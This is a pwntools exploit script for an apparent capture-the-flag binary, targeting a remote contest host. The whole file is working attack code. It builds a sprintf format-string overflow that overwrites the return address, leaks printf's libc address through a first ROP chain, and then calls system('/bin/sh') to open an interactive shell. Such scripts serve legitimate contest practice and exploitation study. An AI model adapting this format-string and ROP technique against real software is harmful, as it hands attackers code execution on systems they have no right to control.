#! /usr/bin/env python
from pwn import *
from pwnlib.util.proc import tracer

elf = ELF("./vuln_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.terminal = ['/bin/bash', '-c', 'KITTY_ID=$(kitty @ launch --cwd=current); kitty @ send-text -m id:$KITTY_ID exec $0 $@ \\\\n']
context.binary = elf
debug_script = '''
b *vuln+155
c
#parse arg
#b *((long)sprintf + 0x12099) 
# end of args
#b *((long)sprintf + 0x120f0)
set $buf = $rsp
hexdump $buf 288
#c
ni
hexdump $buf 288
#b printf
#c
'''

def conn():
    if not args.REMOTE:
        if args.D:
            p = gdb.debug([elf.path], gdbscript=debug_script)
        else:
            p = process([elf.path])
        print(tracer(p.pid))
    else:
        p = remote("sprinter.chal.idek.team", 1337)

    return p

def main():
    num = 1
#    for i in range(20):
    p = conn()

    # 0x0000000000401373: pop rdi; ret;
    # 0x0000000000401371: pop rsi; pop r15; ret; 
    p_rdi = 0x0000000000401373
    p_rsi_r15 = 0x0000000000401371
    
    plt_f = elf.symbols['fgets']
    plt_p = elf.symbols['printf']
    got_p = elf.got['printf']
    call_vuln = 0x4012f8
    ret = 0x401303

    printf = 0

    def stage1():
        nonlocal printf

        if args.REMOTE:
            p.recvline()
        x = p.recvuntil(b': ')
        buf = int(x[-16:-2],16)

        assert(buf & 0xFF != 0)
        print(hex(buf))
        s1 = b'%c%c%c%*c%c%11cZZZZZ%s\0\0'
        s2 = b'z\xad\x12\x40' # return address
        s2_size = 153
        out_ptr = len(s1) + s2_size + 1
        arg_ptr = len(s1)
        print(arg_ptr)
        print(out_ptr)

        #while (arg_ptr < out_ptr+8):
        #    s2 += b'%c'
        #    arg_ptr +=8
        #    out_ptr +=1

        # since s1 has 7 conversions, the first 7 conversions of s2 will  be skipped
        # after we trigger a reparse
        s2 += b'%4$c' + b'%%'*6

        # we need to 16-byte align the bottom of the ROP chain, and the byte before it needs to be 0
        align = 14 - out_ptr%16
        if align == 0:
            align = 8
        out_ptr+=align
        s2+=b'%' + bytes(str(align), 'ascii') + b'c'

        ropchain = b"\x00\x00"
        rop_ptr = out_ptr + buf + 2
        print("rop ptr:", hex(rop_ptr))
        num_pops = len(s2)//8
        #ropchain += p64(p_rdi) 
        #rop_end = rop_ptr + 48
        #ropchain += p64(rop_end)
        #ropchain += p64(p_rsi_r15)
        #ropchain += p64(0x7777777777777777)
        #ropchain += p64(0x7777777777777777)
        #ropchain += p64(plt_f)

        ropchain += p64(p_rdi)
        ropchain += p64(got_p)
        ropchain += p64(plt_p)
        ropchain += p64(call_vuln)
        
        for i in ropchain:
            out_ptr += 1
            if (i == 0):
                #if (arg_ptr == 240):
                #    s2 += b'%4$c'
                #else:    
                #    s2 += b'%c'
                #    arg_ptr += 8
                #assert(arg_ptr < 256)
                s2 += b'%4$c'
            elif (i == 0x25):
                s2 += b'%%'
            else:
                s2 += p8(i)

        print(s2)
        s2 += b'%' + bytes(str(264-out_ptr),'ascii') + b'c'
        s2 += b'%4$c'
        s2 += b'%' + bytes(str(5+0xf0//8),'ascii') + b'$.7s'
        for i in p64(rop_ptr - 8):
            if (i == 0):
                s2 += b'%4$c'
            elif (i == 0x25):
                s2 += b'%%'
            else:
                s2 += p8(i)

        print(len(s2))
        print(len(s1))

        print(s2)

        print("len(s2): ", len(s2))
        print("s2_size: ", s2_size)
        assert(len(s2) == s2_size)
        #s2 = s2.ljust(s2_size+3,b'x')
        payload = s1 + p64(buf+len(s1)+8) + s2

        assert(len(payload) <= 0xf0);
        payload = payload.ljust(0xf0, b'\x00');
        payload += p64(buf + 265) # canary address
        payload += b'\n'

        print("SENDING STAGE1 PAYLOAD: ", payload)
        p.send(payload)

        #rop2_ptr = rop_end
        #rop2 = b""

        #rop2 += p64(p_rdi)
        #rop2 += p64(got_p)
        #rop2 += p64(plt_p)
        #rop2 += p64(p_rdi) 
        #rop2_end = rop2_ptr + 72
        #ropchain += p64(rop2_end)
        #ropchain += p64(p_rsi_r15)
        #ropchain += p64(0x7777777777777777)
        #ropchain += p64(0x7777777777777777)
        #ropchain += p64(plt_f)

        #p.send(rop2)

        printf_bytes = p.recvuntil(b"Enter", drop=True)
        printf = u64(printf_bytes.ljust(8, b'\x00'))
        print("printf at", hex(printf))


    def stage2():
        nonlocal printf

        x = p.recvuntil(b': ')
        buf = int(x[-16:-2],16)

        assert(buf & 0xFF != 0)
        print(hex(buf))
        s1 = b'%c%c%c%*c%c%11cZZZZZ%s\0\0'
        s2 = b'z\xad\x12\x40' # return address
        s2_size = 111
        out_ptr = len(s1) + s2_size + 1
        arg_ptr = len(s1)
        print(arg_ptr)
        print(out_ptr)

        #while (arg_ptr < out_ptr+8):
        #    s2 += b'%c'
        #    arg_ptr +=8
        #    out_ptr +=1

        # since s1 has 7 conversions, the first 7 conversions of s2 will  be skipped
        # after we trigger a reparse
        s2 += b'%4$c' + b'%%'*6

        # we need to 16-byte align the bottom of the ROP chain, and the byte before it needs to be 0
        align = 14 - out_ptr%16
        if align == 0:
            align = 8
        out_ptr+=align
        s2+=b'%' + bytes(str(align), 'ascii') + b'c'
        
        libc_base = printf - libc.symbols["printf"]
        binsh = libc_base + next(libc.search(b"/bin/sh"))
        system = libc_base + libc.symbols["system"]

        ropchain = b"\x00\x00"
        rop_ptr = out_ptr + buf + 2
        print("rop ptr:", hex(rop_ptr))
        num_pops = len(s2)//8
        ropchain += p64(p_rdi) 
        ropchain += p64(binsh)
        ropchain += p64(system)

        for i in ropchain:
            out_ptr += 1
            if (i == 0):
                #if (arg_ptr == 240):
                #    s2 += b'%4$c'
                #else:    
                #    s2 += b'%c'
                #    arg_ptr += 8
                #assert(arg_ptr < 256)
                s2 += b'%4$c'
            elif (i == 0x25):
                s2 += b'%%'
            else:
                s2 += p8(i)

        print(s2)
        s2 += b'%' + bytes(str(264-out_ptr),'ascii') + b'c'
        s2 += b'%4$c'
        s2 += b'%' + bytes(str(5+0xf0//8),'ascii') + b'$.7s'
        for i in p64(rop_ptr - 8):
            if (i == 0):
                s2 += b'%4$c'
            elif (i == 0x25):
                s2 += b'%%'
            else:
                s2 += p8(i)

        print(len(s2))
        print(len(s1))

        print(s2)

        print("len(s2): ", len(s2))
        print("s2_size: ", s2_size)
        assert(len(s2) == s2_size)
        #s2 = s2.ljust(s2_size+3,b'x')
        payload = s1 + p64(buf+len(s1)+8) + s2

        assert(len(payload) <= 0xf0);
        payload = payload.ljust(0xf0, b'\x00');
        payload += p64(buf + 265) # canary address
        payload += b'\n'

        print("SENDING STAGE2 PAYLOAD: ", payload)
        p.send(payload)

    # good luck pwning :)

    stage1()
    stage2()
    p.interactive()



if __name__ == "__main__":
    main()